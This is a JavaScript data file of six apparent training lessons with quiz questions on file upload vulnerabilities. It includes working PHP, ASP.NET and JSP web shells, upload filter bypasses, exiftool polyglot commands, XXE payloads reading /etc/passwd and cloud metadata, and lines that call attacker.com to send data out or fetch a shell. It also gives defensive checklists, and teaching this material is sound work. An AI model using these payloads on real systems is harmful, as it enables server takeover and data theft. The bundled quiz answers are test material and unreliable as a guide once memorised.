const LESSONS = [
  {
    title: "Unrestricted File Upload",
    points: 10,
    content: `File upload features are extremely common attack vectors when not properly secured. The most dangerous scenario allows uploading executable files that the server then runs.

THE CLASSIC WEB SHELL ATTACK:
  1. Attacker uploads: shell.php containing <?php system($_GET['cmd']); ?>
  2. File is saved to /var/www/html/uploads/shell.php
  3. Attacker visits: http://site.com/uploads/shell.php?cmd=whoami
  4. Server executes whoami and returns the output
  5. Full Remote Code Execution (RCE) achieved!

FILE UPLOAD RISKS BY SEVERITY:
  1. Remote Code Execution (RCE) — upload a web shell (most dangerous)
  2. Stored XSS — upload HTML/SVG file with JavaScript
  3. Malware Distribution — upload malicious files for others to download
  4. XML External Entity (XXE) — upload malicious XML/SVG files
  5. Server-Side Includes (SSI) — upload .shtml files with SSI directives
  6. Denial of Service (DoS) — upload massive files to exhaust disk/memory

COMMON DEFENSES AND BYPASSES:

Defense 1: File Extension Whitelist (only .jpg, .png)
  Bypass: shell.php.jpg, shell.phtml, shell.php5, shell.pHp (case)

Defense 2: MIME Type / Content-Type Check
  Bypass: Intercept upload in Burp Suite, change Content-Type to image/jpeg

Defense 3: Magic Bytes Check (check file header bytes)
  Bypass: Add GIF89a; to the start of your PHP file
  (File starts with valid GIF magic bytes but contains PHP code after)

Defense 4: Anti-virus Scanning
  Bypass: Custom/obfuscated payloads, encrypted webshells

Defense 5: Size Check
  Limited bypass: Use minimal webshells <?php system($_GET[0]); ?>`,
    questions: [
      { q: "What is the most severe consequence of an unrestricted file upload vulnerability?", a: "Remote Code Execution (RCE)" },
      { q: "What file extension indicates a PHP script most targeted for web shell uploads?", a: ".php" },
      { q: "What technique adds real file headers like 'GIF89a;' to a malicious file to bypass magic byte checks?", a: "Magic bytes injection" },
      { q: "What request interception tool can change the Content-Type header to bypass MIME type checks?", a: "Burp Suite" },
      { q: "What extension variation of .php attempts to bypass case-sensitive extension filters?", a: ".pHp (case variation) or .php5, .phtml" }
    ]
  },
  {
    title: "Web Shells & Exploitation",
    points: 10,
    content: `A web shell is a malicious script uploaded to a server that gives the attacker a web-based command execution interface.

SIMPLE WEB SHELLS:

PHP one-liner (GET method):
  <?php system($_GET['cmd']); ?>
  Usage: http://site.com/uploads/shell.php?cmd=whoami

PHP one-liner (POST method — harder to detect in logs):
  <?php system($_POST['cmd']); ?>

PHP with formatted output:
  <?php
  if(isset($_REQUEST['cmd'])){
    echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
  }
  ?>

PHP with basic authentication:
  <?php
  if($_GET['pass'] === 'secret123') { system($_GET['cmd']); }
  ?>

ASP.NET web shell:
  <%@ Page Language="C#" %>
  <% Response.Write(new System.Diagnostics.Process() {
     StartInfo = {FileName="cmd.exe", Arguments="/c "+Request["cmd"],
     UseShellExecute=false, RedirectStandardOutput=true}
  }.Start().StandardOutput.ReadToEnd()); %>

JSP (Java Server Pages) web shell:
  <%
  String cmd = request.getParameter("cmd");
  Process p = Runtime.getRuntime().exec(cmd);
  %>

ADVANCED WEB SHELLS (Popular tools):
  - b374k: PHP web shell with file manager, SQL client, command execution
  - c99: Feature-rich PHP shell with file/directory browsing
  - p0wny-shell: Minimal but functional terminal-style interface
  - China Chopper: Tiny one-liner shell widely used in APT operations

FINDING UPLOADED SHELLS:
  - Scan upload directories for executable file extensions
  - Check webserver access logs for unusual requests to /uploads/
  - Monitor filesystem for newly created .php files in upload dirs`,
    questions: [
      { q: "In a PHP web shell, what function executes system commands and returns output?", a: "system() (or shell_exec(), exec())" },
      { q: "What is the best defense location for storing uploaded files — inside or outside the web root?", a: "Outside the web root" },
      { q: "What are the first 4 hex bytes (magic bytes) of a PNG image file?", a: "89 50 4E 47" },
      { q: "What popular feature-rich PHP web shell includes a file manager and SQL client?", a: "b374k" },
      { q: "What HTTP method for web shell commands is harder to detect in web server access logs?", a: "POST" }
    ]
  },
  {
    title: "Bypassing Advanced Upload Filters",
    points: 10,
    content: `When basic bypass techniques fail, attackers use more sophisticated methods to get their web shells onto servers.

DOUBLE EXTENSION ATTACK:
  Some servers process the last extension: shell.php.jpg
  Apache misconfig (AddHandler): maps .php anywhere in the name
  Example: /etc/apache2/.htaccess — AddHandler application/x-httpd-php .php
  Any file with .php anywhere (shell.php.jpg) executes as PHP!

EXTENSION CASE SENSITIVITY:
  Linux filesystem: case-sensitive (Shell.PHP works on Apache + PHP)
  Common bypasses:
    .PHP  .Php  .pHP  .phP  .pHp

ALTERNATIVE PHP EXTENSIONS (often not blocked):
  .php3  .php4  .php5  .php7  .phtml  .phar  .shtml

CONTENT-TYPE SPOOFING:
  The Content-Type header in a multipart upload can be freely changed.
  Original: Content-Type: application/x-php
  Modified: Content-Type: image/jpeg  (in Burp Repeater)
  Server checks the header, not the actual content.

SVG FILE XSS:
  SVG files are XML and can embed JavaScript:
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.cookie)</script>
  </svg>
  Even if PHP is blocked, uploading SVG achieves stored XSS!

POLYGLOT FILES (Image + PHP):
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg
  The file is a valid JPEG AND contains PHP code.
  If the server passes it to PHP interpreter, it executes.
  Even passes basic image validation checks!

FILE EXTENSION PARSER VULNERABILITIES:
  file.php;.jpg  → Apache may strip ;.jpg, execute as PHP
  file.php%00.jpg → Null byte truncation (older servers)
  file.php....   → Windows ignores trailing dots, executes as PHP

EXIFTOOL METADATA INJECTION:
  Embed PHP in EXIF data of a real image:
  exiftool -Comment='<?php system($_REQUEST["c"]); ?>' image.jpg
  If server reads and displays EXIF data through PHP → RCE`,
    questions: [
      { q: "What Apache configuration directive causes any file with .php in its name to be executed as PHP?", a: "AddHandler application/x-httpd-php .php" },
      { q: "What alternative PHP file extension (not .php) is commonly forgotten in extension blacklists?", a: ".phtml (or .phar, .php5, .php7)" },
      { q: "What tool can embed PHP code into a JPEG image's EXIF metadata?", a: "exiftool" },
      { q: "What XML-based image format can contain embedded JavaScript and is often overlooked by file upload filters?", a: "SVG" },
      { q: "What is a polyglot file in the context of file upload attacks?", a: "A file that is simultaneously valid as two different file types (e.g., valid JPEG and valid PHP)" }
    ]
  },
  {
    title: "Server-Side Issues: XXE & SSRF via Upload",
    points: 10,
    content: `File uploads can trigger server-side vulnerabilities beyond web shell execution — particularly XXE and SSRF through malicious file content.

XML EXTERNAL ENTITY (XXE) VIA FILE UPLOAD:
  Affected file types: XML, DOCX, XLSX, SVG, PDF (with XML metadata)

  A malicious XML file that reads /etc/passwd:
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <root><data>&xxe;</data></root>

  When the server parses this XML, it substitutes &xxe; with
  the contents of /etc/passwd!

  SSRF via XXE (accessing internal services):
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  ]>

  Blind XXE (no direct output):
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://attacker.com/?data=...">
  ]>
  (Triggers an HTTP request to attacker.com carrying the data)

DOCX/XLSX XXE:
  .docx and .xlsx files are ZIP archives containing XML files.
  Modify the XML inside (word/document.xml or [Content_Types].xml)
  to include XXE payloads before re-zipping:
    unzip file.docx -d extracted/
    # Edit extracted/word/document.xml with XXE payload
    zip -r malicious.docx extracted/

SSRF VIA IMAGE PROCESSING:
  Libraries like ImageMagick process URLs in image metadata:
  The "ImageMagick" vulnerability (ImageTragick, CVE-2016-3714):
    push graphic-context
    viewbox 0 0 640 480
    image over 0,0 0,0 'https://attacker.com/shell.php'
    pop graphic-context
  If the server uses ImageMagick to process uploaded images,
  this fetches and potentially executes the remote URL.

PREVENTION:
  - Disable external entity resolution in XML parsers
  - Use safe parsers: lxml (Python with resolve_entities=False)
  - Update ImageMagick and disable vulnerable delegates in policy.xml
  - Scan uploaded content with dedicated security libraries`,
    questions: [
      { q: "What XML attack uses external entity references to read local files or make server-side HTTP requests?", a: "XML External Entity injection (XXE)" },
      { q: "What file format (used by Microsoft Office) is a ZIP archive containing XML files vulnerable to XXE?", a: "DOCX (or XLSX)" },
      { q: "What cloud metadata URL can be reached via XXE SSRF to steal cloud credentials?", a: "http://169.254.169.254/latest/meta-data/" },
      { q: "What ImageMagick vulnerability (CVE-2016-3714) allowed code execution via malicious image files?", a: "ImageTragick" },
      { q: "What XML parser setting should be disabled to prevent XXE attacks?", a: "External entity resolution (resolve_entities=False or equivalent)" }
    ]
  },
  {
    title: "Secure File Upload Implementation",
    points: 10,
    content: `Properly securing file uploads requires multiple layered defenses. A single control is never sufficient — attackers bypass any one restriction.

COMPLETE SECURE UPLOAD CHECKLIST:

1. STORE OUTSIDE WEB ROOT:
   Upload to /var/uploads/ (not /var/www/html/uploads/)
   Serve files through a PHP/Python script that streams the file:
   serve.php?id=12345 → reads /var/uploads/12345 → streams with Content-Type

2. RENAME FILES (UUID/random names):
   Never use the original filename — rename to UUID:
   user_photo.php → a7f3b2c4-1234-5678-abcd-ef0123456789
   No .php extension = cannot execute even if in web root!

3. VALIDATE EXTENSION (Server-side Whitelist):
   $allowed = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
   $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
   if (!in_array($ext, $allowed)) { die('Invalid file type'); }
   Never use a blacklist — always incomplete.

4. VALIDATE CONTENT (Magic Bytes):
   Read first bytes and compare to known signatures:
   JPEG: FF D8 FF E0 or FF D8 FF E1
   PNG:  89 50 4E 47 0D 0A 1A 0A
   GIF:  47 49 46 38 37 61 or 47 49 46 38 39 61
   PDF:  25 50 44 46

   Python: python-magic → magic.from_file(path, mime=True)
   PHP:    mime_content_type($file_path)

5. LIMIT FILE SIZE:
   Server-side: if ($_FILES['file']['size'] > 5000000) { die('Too large'); }
   Web server: LimitRequestBody 5242880 (Apache)

6. DISABLE EXECUTION IN UPLOAD DIRECTORY (.htaccess):
   <Directory /var/www/html/uploads>
     php_flag engine off
     Options -ExecCGI
     RemoveHandler .php .phtml .php5
   </Directory>

7. ANTI-VIRUS SCANNING:
   Use ClamAV or a cloud AV API to scan uploaded files

8. CONTENT SECURITY POLICY (for SVG uploads):
   SVG files can contain JavaScript — serve with CSP headers
   Content-Security-Policy: default-src 'self'; script-src 'none'`,
    questions: [
      { q: "What is the safest location to store uploaded files to prevent direct web access?", a: "Outside the web root (e.g., /var/uploads/)" },
      { q: "What method of renaming uploaded files prevents extension-based execution even if stored in the web root?", a: "Renaming to a UUID (no file extension)" },
      { q: "What Apache directive removes PHP handler from the uploads directory to prevent script execution?", a: "RemoveHandler .php .phtml" },
      { q: "Should you use an extension whitelist or blacklist to validate file uploads?", a: "Whitelist (only allow known safe extensions)" },
      { q: "What open-source antivirus engine is commonly used to scan uploaded files on Linux servers?", a: "ClamAV" }
    ]
  },
  {
    title: "Real-World File Upload CVEs & Bug Bounties",
    points: 10,
    content: `File upload vulnerabilities have led to some of the most impactful real-world bugs, attracting major bug bounty payouts.

NOTABLE REAL-WORLD CASES:

1. CVE-2021-3129 — Laravel Debug Mode RCE:
   When Laravel's debug mode was enabled (common in misconfigs),
   attackers could upload malicious log files that were deserialized,
   leading to remote code execution. Affected thousands of sites.

2. WORDPRESS FILE UPLOAD BUGS (Numerous CVEs):
   Many WordPress plugins have had file upload vulnerabilities:
   - Gravity Forms, WP File Manager, Fancy Product Designer
   - CVE-2020-25213 (WP File Manager): Unauthenticated file upload
     → RCE. Exploited within hours of disclosure on 700,000+ sites.

3. GITLAB FILE UPLOAD → SSRF (CVE-2021-22214):
   GitLab allowed uploading files that triggered server-side requests,
   enabling SSRF to access internal cloud metadata.

4. TELERIK UI (CVE-2019-18935):
   Deserialization vulnerability in the file upload handler.
   Used in attacks against US government agencies.
   CVSS Score: 9.8 (Critical).

BUG BOUNTY EXAMPLES:
   Facebook (2020): $16,000 for arbitrary file read via avatar upload
   HackerOne: Multiple $10,000+ payouts for RCE via file upload

DEFENSIVE ARCHITECTURE:
  For high-risk applications (banking, healthcare):
  - Process uploaded files in an isolated sandbox (VM, container)
  - Re-encode images through a safe pipeline:
      User uploads JPEG → Re-encode with Pillow/Imagemagick (safe config)
      → New clean file stored → Original discarded
  - This strips all metadata, EXIF, and embedded payloads

CHECKLIST FOR PENETRATION TESTERS:
  1. Identify all file upload endpoints
  2. Test each extension from the dangerous list
  3. Test Content-Type spoofing
  4. Test magic bytes bypass with polyglot files
  5. Test null byte injection: file.php%00.jpg
  6. Test case variation: .pHp .PHP
  7. Test double extensions: file.php.jpg
  8. Check if uploaded files are served from the same origin
  9. Try SVG with XSS if PHP not executable
  10. Try XXE in XML/DOCX/SVG uploads`,
    questions: [
      { q: "What CVE identified the WordPress WP File Manager plugin unauthenticated file upload vulnerability affecting 700,000+ sites?", a: "CVE-2020-25213" },
      { q: "What defensive technique re-encodes uploaded images through a safe image processing pipeline to strip malicious payloads?", a: "Image re-encoding (using safe libraries like Pillow to regenerate clean files)" },
      { q: "What US government-targeted file upload vulnerability involved Telerik UI deserialization?", a: "CVE-2019-18935" },
      { q: "What security architecture processes uploaded files inside an isolated environment to prevent server compromise?", a: "Sandboxed processing (VM or container isolation)" },
      { q: "When testing file uploads in a pentest, what null byte payload attempts to bypass extension checks on older servers?", a: "file.php%00.jpg" }
    ]
  }
];
